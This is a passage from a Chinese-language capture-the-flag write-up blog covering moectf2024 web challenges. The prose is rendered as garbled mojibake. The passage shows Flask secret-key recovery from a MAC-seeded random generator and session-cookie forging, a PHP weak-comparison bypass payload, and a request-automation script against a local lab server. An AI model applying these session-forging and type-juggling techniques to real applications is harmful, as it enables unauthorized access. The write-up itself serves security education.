class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>).read()<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Access denied&#x27;</span><br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(<br>        debug=<span class="hljs-literal">True</span>,<br>        host=<span class="hljs-string">&quot;0.0.0.0&quot;</span><br>    )<br></code></pre></td></tr></table></figure>
<p>è·å¾—æºç <br>ç®€å•çœ‹ä¸€ä¸‹ï¼Œé‡è¦çš„å‡ è¡Œä»£ç </p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">random<span class="hljs-selector-class">.seed</span>(uuid<span class="hljs-selector-class">.getnode</span>()) <span class="hljs-selector-id">#uuid</span><span class="hljs-selector-class">.getnode</span>()æ˜¯é¶æœºçš„macåœ°å€<br>app<span class="hljs-selector-class">.config</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>]</span> = <span class="hljs-built_in">str</span>(random<span class="hljs-selector-class">.random</span>()*<span class="hljs-number">233</span>)<br></code></pre></td></tr></table></figure>

<p>åªè¦çŸ¥é“äº†ç§å­å€¼ä¸ºå¤šå°‘ï¼Œå°±èƒ½çŸ¥é“å¯†é’¥æ˜¯ä»€ä¹ˆ<br>macåœ°å€åœ¨&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;addressä¸­å­˜å‚¨<br>è·å¾—macåœ°å€ä¸º76:12:00:da:b0:2f å…¶æœ¬èº«å°±æ˜¯16è¿›åˆ¶</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">0x761200dab02f</span><br></code></pre></td></tr></table></figure>
<p>çŸ¥é“äº†ç§å­ï¼Œå“ªä¸ªå°±å¯ä»¥æ¨å‡ºå¯†é’¥äº†,è¿™é‡Œè¦ç”¨python2è¿è¡Œï¼Œå› ä¸ºé¶æœºæ˜¯python2ï¼ŒåŒºåˆ«æ˜¯python2ä¸python3ç”Ÿæˆçš„ä½æ•°ä¸åŒ</p>
<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-keyword">import</span> random<br><br>random.seed(<span class="hljs-number">0x761200dab02f</span>)<br><span class="hljs-built_in">print</span><span class="hljs-function"><span class="hljs-params">(str(random.random()*<span class="hljs-number">233</span>))</span></span><br><span class="hljs-function"></span><br><span class="hljs-function">-&gt;</span><span class="hljs-number">179.873037007</span><br></code></pre></td></tr></table></figure>

<p>ç„¶åå†çœ‹</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">session</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&#x27;www-data&#x27;</span><br></code></pre></td></tr></table></figure>
<p>ä¸»é¡µæŠŠusernameé»˜è®¤ä¸ºwww-dataï¼Œè€Œ</p>
<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-meta">@app</span>.route(<span class="hljs-string">&#x27;/flag&#x27;</span>)<br>def flag():<br>    <span class="hljs-keyword">if</span> session and session[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-string">&#x27;fuck&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">open</span>(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>).read()<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Access denied&#x27;</span><br></code></pre></td></tr></table></figure>

<p>å½“usernameä¸ºfuckæ—¶ä¼šè¿”å›flag<br>çœ‹ä¸€ä¸‹æˆ‘ä»¬çš„session</p>
<p><img src="/images/BCC08DDB5537412d915C5F92E0CF9DBC.png" srcset="/img/loading.gif" lazyload><br>è¿™ä¸ªsessionå¥½åƒjwtå•Šï¼Œä½†æ˜¯ä¸æ˜¯çš„<br><img src="/images/5EA6865C8628460f8D2909F326522F4B.png" srcset="/img/loading.gif" lazyload><br>è¿™é‡Œusernameå¯¹åº”çš„æ˜¯base64ç¼–ç åçš„www-data<br>æˆ‘ä»¬æŠŠè¿™ä¸€æ®µæˆªå–å‡ºæ¥ï¼ŒæŠŠfuckå¡«è¿›å»</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">&#123;&quot;username&quot;:&#123;&quot; <span class="hljs-selector-tag">b</span>&quot;:<span class="hljs-string">&quot;fuck&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure>
<p>æ¥ä¸‹æ¥åˆ©ç”¨<a target="_blank" rel="noopener" href="https://github.com/noraj/flask-session-cookie-manager">flask_session_cookie_manager</a>ä¼ªé€ session</p>
<p>ä½¿ç”¨è¿™ä¸ªè„šæœ¬ä¼ªé€ session</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> flask_session_cookie_manager3.<span class="hljs-keyword">py</span> encode -s <span class="hljs-string">&#x27;179.873037007&#x27;</span> -t <span class="hljs-string">&quot;&#123;&#x27;username&#x27;: b&#x27;fuck&#x27;&#125;&quot;</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/6E0135608F19422b8C0FB5A41E977D8E.png" srcset="/img/loading.gif" lazyload><br>&#x2F;flagä¸‹æŠŠç”Ÿæˆçš„sessionæ›¿æ¢åŸæ¥çš„session</p>
<p><img src="/images/F31AF79AC09840fcB45B03D66BE164D0.png" srcset="/img/loading.gif" lazyload></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/since_2020/article/details/119543172">flask sessionä¼ªé€ adminèº«ä»½</a></p>
<h2 id="moectf2024-é™æ€ç½‘é¡µ"><a href="#moectf2024-é™æ€ç½‘é¡µ" class="headerlink" title="moectf2024 -é™æ€ç½‘é¡µ"></a>moectf2024 -é™æ€ç½‘é¡µ</h2><p>hintï¼šæ— æ„é—´å‘ç° Sxrhhh çš„ä¸ªäººåšå®¢ã€‚ä½†æ˜¯å¥½åƒæ˜¯é™æ€åšå®¢ï¼Œåº”è¯¥æ²¡ä»€ä¹ˆæ”»æ‰“çš„å¿…è¦äº†ã€‚ã€‚ã€‚</p>
<p>ç½‘é¡µç¡®å®æ˜¯é™æ€ç½‘é¡µï¼ŒæŸ¥çœ‹æºç ä¹Ÿæ²¡æœ‰æœ‰æ•ˆçš„ä¿¡æ¯ï¼Œä½†æ˜¯å‘ç°å³ä¸‹è§’æœ‰ä¸€ä¸ªå¯ä»¥äº¤äº’çš„äººç‰©ï¼ŒæŠ“ä¸€ä¸‹åŒ…çœ‹æœ‰ä»€ä¹ˆèµ„æºå¯ä»¥åˆ©ç”¨ï¼ŒæŠ“åŒ…å‘ç°é¡µé¢è°ƒç”¨äº†<br><img src="/images/E84ACFB2B7844a6bB4AC93F317BB8382.png" srcset="/img/loading.gif" lazyload><br>è¿›å…¥final1l1l_challenge.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;final1l1l_challenge.php&#x27;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$b</span>)) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$a</span>) &amp;&amp; !<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$b</span>)) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> == <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) == <span class="hljs-variable">$b</span>[<span class="hljs-variable">$a</span>]) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;noooooooooooo&#x27;</span>);<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;Notice the param type!&#x27;</span>);<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;Where is your param?&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>äº†è§£ä¸€ä¸‹</p>
<figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos"><span class="hljs-built_in">$b</span>[<span class="hljs-built_in">$a</span>]#è‹¥<span class="hljs-built_in">$a</span>==<span class="hljs-number">0</span>,åˆ™è¿”å›<span class="hljs-built_in">$b</span>ç¬¬ä¸€ä¸ªå­—ç¬¦æˆ–æ•°ç»„ç¬¬ä¸€ä¸ªçš„å€¼<br></code></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">GET</span><br>?<span class="hljs-attribute">a</span>=QNKCDZO<br>POST<br><span class="hljs-attribute">b</span>=0%00<br></code></pre></td></tr></table></figure>
<p>å¯¹äº$a&#x3D;&#x3D;0<br>å¼±æ¯”è¾ƒä¸‹ï¼Œå½“ä¸€ä¸ªå­—ç¬¦ä¸²ä¸æ•°å­—è¿›è¡Œæ¯”è¾ƒæ—¶ï¼ŒPHPä¼šå°è¯•å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºä¸€ä¸ªæ•°å­—ã€‚å¦‚æœå­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯ä¸€ä¸ªæ•°å­—ï¼Œé‚£ä¹ˆPHPä¼šå°†å…¶è½¬æ¢ä¸ºè¯¥æ•°å­—ï¼›å¦‚æœå­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸æ˜¯æ•°å­—ï¼Œé‚£ä¹ˆPHPä¼šå°†æ•´ä¸ªå­—ç¬¦ä¸²è½¬æ¢ä¸º0<br>PHPåœ¨å¤„ç†å“ˆå¸Œå­—ç¬¦ä¸²æ—¶ï¼Œå®ƒæŠŠæ¯ä¸€ä¸ªä»¥â€œ0Eâ€å¼€å¤´çš„å“ˆå¸Œå€¼éƒ½è§£é‡Šä¸º0ï¼Œæ‰€ä»¥å¦‚æœä¸¤ä¸ªä¸åŒçš„å¯†ç ç»è¿‡å“ˆå¸Œä»¥åï¼Œå…¶å“ˆå¸Œå€¼éƒ½æ˜¯ä»¥â€œ0Eâ€å¼€å¤´çš„ï¼ŒPHPä¼šå½“ä½œç§‘å­¦è®¡æ•°æ³•æ¥å¤„ç†ï¼Œä¹Ÿå°±æ˜¯0çš„næ¬¡æ–¹ï¼Œå¾—åˆ°çš„å€¼æ¯”è¾ƒçš„æ—¶å€™éƒ½ç›¸åŒã€‚</p>
<h2 id="moectf2024-å‹‡é—¯é“œäººé˜µ"><a href="#moectf2024-å‹‡é—¯é“œäººé˜µ" class="headerlink" title="moectf2024 å‹‡é—¯é“œäººé˜µ"></a>moectf2024 å‹‡é—¯é“œäººé˜µ</h2><p><img src="/images/87D69C227E7D401c91396D0920D92184.png" srcset="/img/loading.gif" lazyload><br>å¥½ä¹…æ²¡å†™è„šæœ¬äº†ï¼Œå…ˆæ‹‰å¨å±å±±</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import requests<br>import re<br><br>a =requests.session()<br><br>url = <span class="hljs-string">&#x27;http://127.0.0.1:57542/restart?&#x27;</span><br>data=&#123;<br>    <span class="hljs-string">&quot;player&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>,<br>    <span class="hljs-string">&quot;direct&quot;</span>:<span class="hljs-string">&#x27;å¼Ÿå­æ˜ç™½&#x27;</span><br>&#125;<br><br><span class="hljs-keyword">while</span> 1:<br>    <span class="hljs-attribute">b</span>=a.post(url=url,data=data)<br>    tex = re.findall(r<span class="hljs-string">&#x27;&lt;h1 id=&quot;status&quot;&gt;\s*(.*?)\s*&lt;/h1&gt;&#x27;</span>, b.text)<br>    # <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;text=&#x27;</span>,b.text)<br>    <span class="hljs-built_in">print</span>(tex)<br>    <span class="hljs-attribute">str1</span>=str(tex)<br>    str1 = str1.replace(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;[&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;]&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;str1=&#x27;</span>,str1)<br>    mark = 0<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> str1:<br>        <span class="hljs-keyword">if</span> <span class="hljs-attribute">j</span>==&#x27;,&#x27;:<br>            <span class="hljs-attribute">mark</span>=1  #ä¸¤ä¸ª<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;moectf&#x27;</span> <span class="hljs-keyword">in</span> b.text:<br>        <span class="hljs-built_in">print</span>(b.text)<br>        break<br>    <span class="hljs-keyword">if</span> mark ==0:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;å—¨å—¨å—¨&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-attribute">str1</span>==&#x27;1&#x27;:<br>            data[<span class="hljs-string">&quot;direct&quot;</span>]=<span class="hljs-string">&quot;åŒ—æ–¹&quot;</span><br>        elif <span class="hljs-attribute">str1</span>==&#x27;2&#x27;:<br>            data[<span class="hljs-string">&quot;direct&quot;</span>] = <span class="hljs-string">&quot;ä¸œåŒ—æ–¹&quot;</span><br>        elif str1 == <span class="hljs-string">&#x27;3&#x27;</span>:<br>            data[<span class="hljs-string">&quot;direct&quot;</span>] = <span class="hljs-string">&quot;ä¸œæ–¹&quot;</span><br>        elif <span class="hljs-attribute">str1</span>==&#x27;4&#x27;:<br>            data[<span class="hljs-string">&quot;direct&quot;</span>] = <span class="hljs-string">&quot;ä¸œå—æ–¹&quot;</span><br>        elif <span class="hljs-attribute">str1</span>==&#x27;5&#x27;:<br>            data[<span class="hljs-string">&quot;direct&quot;</span>] = <span class="hljs-string">&quot;å—æ–¹&quot;</span><br>        elif <span class="hljs-attribute">str1</span>==&#x27;6&#x27;:<br>            data[<span class="hljs-string">&quot;direct&quot;</span>] = <span class="hljs-string">&quot;è¥¿å—æ–¹&quot;</span><br>        elif str1 == <span class="hljs-string">&#x27;7&#x27;</span>:<br>            data[<span class="hljs-string">&quot;direct&quot;</span>] = <span class="hljs-string">&quot;è¥¿æ–¹&quot;</span><br>        elif <span class="hljs-attribute">str1</span>==&#x27;8&#x27;:<br>            data[<span class="hljs-string">&quot;direct&quot;</span>] = <span class="hljs-string">&quot;è¥¿åŒ—æ–¹&quot;</span><br>    elif <span class="hljs-attribute">mark</span>==1:<br>        mark1 = 0  # åˆ¤æ–­é€—å·<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;å˜»å˜»å˜»&#x27;</span>)<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> str1:<br>            <span class="hljs-built_in">print</span>(k)<br>            <span class="hljs-keyword">if</span> <span class="hljs-attribute">k</span>==&#x27;1&#x27;and <span class="hljs-attribute">mark1</span>==0:<br>                data[<span class="hljs-string">&quot;direct&quot;</span>] = <span class="hljs-string">&quot;åŒ—æ–¹ä¸€ä¸ªï¼Œ&quot;</span><br>                <span class="hljs-attribute">mark1</span>=1<br>            elif <span class="hljs-attribute">k</span>==&#x27;1&#x27;and <span class="hljs-attribute">mark1</span>==1:<br>                data[<span class="hljs-string">&quot;direct&quot;</span>] += <span class="hljs-string">&quot;åŒ—æ–¹ä¸€ä¸ª&quot;</span><br>            elif <span class="hljs-attribute">k</span>==&#x27;2&#x27;and <span class="hljs-attribute">mark1</span>==0:<br>                data[<span class="hljs-string">&quot;direct&quot;</span>] = <span class="hljs-string">&quot;ä¸œåŒ—æ–¹ä¸€ä¸ªï¼Œ&quot;</span><br>                <span class="hljs-attribute">mark1</span>=1<br>            elif <span class="hljs-attribute">k</span>==&#x27;2&#x27;and <span class="hljs-attribute">mark1</span>==1:<br>                data[<span class="hljs-string">&quot;direct&quot;</span>] += <span class="hljs-string">&quot;ä¸œåŒ—æ–¹ä¸€ä¸ª&quot;</span><br>            elif <span class="hljs-attribute">k</span>==&#x27;3&#x27;and <span class="hljs-attribute">mark1</span>==0:<br>                data[<span class="hljs-string">&quot;direct&quot;</span>] = <span class="hljs-string">&quot;ä¸œæ–¹ä¸€ä¸ªï¼Œ&quot;</span><br>                <span class="hljs-attribute">mark1</span>=1<br>            elif <span class="hljs-attribute">k</span>==&#x27;3&#x27;and <span class="hljs-attribute">mark1</span>==1:<br>                data[<span class="hljs-string">&quot;direct&quot;</span>] += <span class="hljs-string">&quot;ä¸œæ–¹ä¸€ä¸ª&quot;</span><br>            elif <span class="hljs-attribute">k</span>==&#x27;4&#x27;and <span class="hljs-attribute">mark1</span>==0:<br>                data[<span class="hljs-string">&quot;direct&quot;</span>] = <span class="hljs-string">&quot;ä¸œå—æ–¹ä¸€ä¸ªï¼Œ&quot;</span><br>                <span class="hljs-attribute">mark1</span>=1<br>            elif <span class="hljs-attribute">k</span>==&#x27;4&#x27;and <span class="hljs-attribute">mark1</span>==1:<br>                data[<span class="hljs-string">&quot;direct&quot;</span>] += <span class="hljs-string">&quot;ä¸œå—æ–¹ä¸€ä¸ª&quot;</span><br>            elif <span class="hljs-attribute">k</span>==&#x27;5&#x27;and <span class="hljs-attribute">mark1</span>==0:<br>                data[<span class="hljs-string">&quot;direct&quot;</span>] = <span class="hljs-string">&quot;å—æ–¹ä¸€ä¸ªï¼Œ&quot;</span><br>                <span class="hljs-attribute">mark1</span>=1<br>            elif <span class="hljs-attribute">k</span>==&#x27;5&#x27;and <span class="hljs-attribute">mark1</span>==1:<br>                data[<span class="hljs-string">&quot;direct&quot;</span>] += <span class="hljs-string">&quot;å—æ–¹ä¸€ä¸ª&quot;</span><br>            elif <span class="hljs-attribute">k</span>==&#x27;6&#x27;and <span class="hljs-attribute">mark1</span>==0:<br>                data[<span class="hljs-string">&quot;direct&quot;</span>] = <span class="hljs-string">&quot;è¥¿å—æ–¹ä¸€ä¸ªï¼Œ&quot;</span><br>                <span class="hljs-attribute">mark1</span>=1<br>            elif <span class="hljs-attribute">k</span>==&#x27;6&#x27;and <span class="hljs-attribute">mark1</span>==1:<br>                data[<span class="hljs-string">&quot;direct&quot;</span>] += <span class="hljs-string">&quot;è¥¿å—æ–¹ä¸€ä¸ª&quot;</span><br>            elif <span class="hljs-attribute">k</span>==&#x27;7&#x27;and <span class="hljs-attribute">mark1</span>==0:<br>                data[<span class="hljs-string">&quot;direct&quot;</span>] = <span class="hljs-string">&quot;è¥¿æ–¹ä¸€ä¸ªï¼Œ&quot;</span><br>                <span class="hljs-attribute">mark1</span>=1<br>            elif <span class="hljs-attribute">k</span>==&#x27;7&#x27;and <span class="hljs-attribute">mark1</span>==1:<br>                data[<span class="hljs-string">&quot;direct&quot;</span>] += <span class="hljs-string">&quot;è¥¿æ–¹ä¸€ä¸ª&quot;</span><br>            elif <span class="hljs-attribute">k</span>==&#x27;8&#x27;and <span class="hljs-attribute">mark1</span>==0:<br>                data[<span class="hljs-string">&quot;direct&quot;</span>] = <span class="hljs-string">&quot;è¥¿åŒ—æ–¹ä¸€ä¸ªï¼Œ&quot;</span><br>                <span class="hljs-attribute">mark1</span>=1<br>            elif <span class="hljs-attribute">k</span>==&#x27;8&#x27;and <span class="hljs-attribute">mark1</span>==1:<br>                data[<span class="hljs-string">&quot;direct&quot;</span>] += <span class="hljs-string">&quot;è¥¿åŒ—æ–¹ä¸€ä¸ª&quot;</span><br><br><br><br>    <span class="hljs-built_in">print</span>(f<span class="hljs-string">&#x27;url=&#123;url&#125; data=&#123;data&#125;&#x27;</span>)<br>    url = <span class="hljs-string">&#x27;http://127.0.0.1:57542/&#x27;</span><br><br><br></code></pre></td></tr></table></figure>

<h2 id="moectf2024-Re-ä»é›¶å¼€å§‹çš„-XDU-æ•™ä¹¦ç”Ÿæ´»"><a href="#moectf2024-Re-ä»é›¶å¼€å§‹çš„-XDU-æ•™ä¹¦ç”Ÿæ´»" class="headerlink" title="moectf2024 Re: ä»é›¶å¼€å§‹çš„ XDU æ•™ä¹¦ç”Ÿæ´»"></a>moectf2024 Re: ä»é›¶å¼€å§‹çš„ XDU æ•™ä¹¦ç”Ÿæ´»</h2><p>æç¤ºï¼š<br>ä½¿ç”¨è„šæœ¬é‡å¤å‘é€è¯·æ±‚ç›´åˆ°æ‰€æœ‰äººéƒ½ç­¾ä¸Šåˆ°å³å¯ã€‚å¦‚æœæ€è·¯å—é˜»æˆ–è€…ä¸çŸ¥é“æ€ä¹ˆå†™è„šæœ¬ï¼Œæ¬¢è¿é€šè¿‡ä¸‹æ–¹é”¤å­è¯¢é—®å‡ºé¢˜äººã€‚<br>å»ºè®®å…ˆä»æµè§ˆå™¨ç®€å•çœ‹ä¸‹è¯¥åšä»€ä¹ˆå†å»çœ‹ä»£ç ç»†èŠ‚ï¼Œç›´æ¥çœ‹ä»£ç å¾ˆéš¾ç†æ¸…æ€è·¯ã€‚<br>&#x2F;v2&#x2F;apis&#x2F;sign&#x2F;refreshQRCode è¯¥æ¥å£ç”¨äºåˆ·æ–°äºŒç»´ç å¹¶è¿”å›æ–°çš„äºŒç»´ç çš„ä¿¡æ¯ã€‚å¦‚ä½•ç»„è£…ä¸€ä¸ªç­¾åˆ°é“¾æ¥å¯å‚è€ƒç½‘é¡µæºç ã€‚ï¼ˆæˆ–è€…éšä¾¿æ‹¿ä¸ªç­¾åˆ°äºŒç»´ç çœ‹ä¸€ä¸‹æŒ‡å‘çš„é“¾æ¥ä¹Ÿå·®ä¸å¤šèƒ½ææ‡‚ï¼‰</p>
<p>ä½ æˆä¸ºäº† XDU çš„ä¸€ä¸ªæ•™å¸ˆï¼Œç°åœ¨ä½ çš„ä»»åŠ¡æ˜¯è®©æ‰€æœ‰å­¦ç”Ÿç­¾ä¸Šåˆ°ï¼ˆéœ€è¦ä»å­¦ç”Ÿè´¦å·ç­¾ä¸Šåˆ°ï¼Œè€Œä¸æ˜¯é€šè¿‡æ•™å¸ˆä»£ç­¾ï¼‰ã€‚ æ³¨æ„ï¼š</p>
<p>æœ¬é¢˜çº¦å®šï¼šæ‰€æœ‰è´¦å·çš„ç”¨æˆ·å &#x3D;&#x3D; æ‰‹æœºå· &#x3D;&#x3D; å¯†ç ã€‚æ•™å¸ˆè´¦å·ç”¨æˆ·åï¼š10000ã€‚<br>å½“æµè§ˆå™¨å¼€å¯ç­¾åˆ°é¡µé¢æ—¶ï¼ŒäºŒç»´ç æ¯ 10 ç§’åˆ·æ–°ä¸€æ¬¡ï¼Œä½¿ç”¨è¿‡æœŸçš„äºŒç»´ç æ— æ³•å®Œæˆç­¾åˆ°ã€‚ï¼ˆæµè§ˆå™¨ä¸å¼€å¯ç­¾åˆ°é¡µé¢æ—¶ï¼Œä¸ä¼šè¿›è¡Œè‡ªåŠ¨åˆ·æ–°ï¼Œå¯ä»¥æŒç»­ä½¿ç”¨æœ‰æ•ˆçš„äºŒç»´ç ï¼Œé™¤éæ‰‹åŠ¨å‘é€åˆ·æ–°äºŒç»´ç çš„è¯·æ±‚ï¼‰ å½“ä½ å®Œæˆä»»åŠ¡åï¼Œè¯·ç»“æŸç­¾åˆ°æ´»åŠ¨ã€‚ä½ å°†ä¼šè·å¾— Flag ã€‚ æœ¬é¢˜çš„éƒ¨åˆ†å‰ç«¯é¡µé¢å–è‡ªè¶…æ˜Ÿå­¦ä¹ é€šç½‘é¡µï¼Œåç«¯ä¸å…¶æ— å…³ï¼Œä»…ç”¨ä½œåœºæ™¯è¿˜åŸï¼Œè¯·å‹¿å¯¹åŸç½‘ç«™è¿›è¡Œä»»ä½•æ”»å‡»è¡Œä¸ºï¼</p>
<p>å…ˆé€šè¿‡10000ç™»å½•è€å¸ˆè´¦å·ï¼Œçœ‹ä¸€ä¸‹æœ‰å¤šå°‘äººéœ€è¦æˆ‘ä»¬ç­¾çš„<br><img src="/images/6E4C0BDE7416417b9C6CF6EEC81C2041.png" srcset="/img/loading.gif" lazyload><br>è¿™ä¹ˆå¤šäººï¼Œå¿…é¡»è¦å†™ä¸€ä¸ªè„šæœ¬äº†<br>å…ˆç™»å½•å­¦ç”Ÿè´¦å·æŠ“åŒ…çœ‹çœ‹<br><img src="/images/29AD5531EE51424c96B6C4ED066768DA.png" srcset="/img/loading.gif" lazyload><br>å‘ç°æˆ‘ä»¬çš„è´¦å·å¯†ç è¢«åŠ å¯†äº†ï¼Œè€Œcookieæ˜¯éšæœºç”Ÿæˆçš„ä¸å¯é¢„æµ‹<br>å†çœ‹çœ‹é™„ä»¶ä¸‹è½½çš„app.py<br>è¿™ä¸¤ä¸ªå‡½æ•°æ¯”è¾ƒé‡è¦ï¼Œæˆ‘ä»¬çš„è´¦å·å¯†ç æ˜¯AESåŠ å¯†<br><img src="/images/597FD934521F4c5e8F5C80CA4AADC9FB.png" srcset="/img/loading.gif" lazyload><br><img src="/images/8F105B596C7544e58B0146CE6DE2D587.png" srcset="/img/loading.gif" lazyload></p>
<p>æ ¹æ®ä»£ç å†™å‡ºAESåŠ å¯†</p>
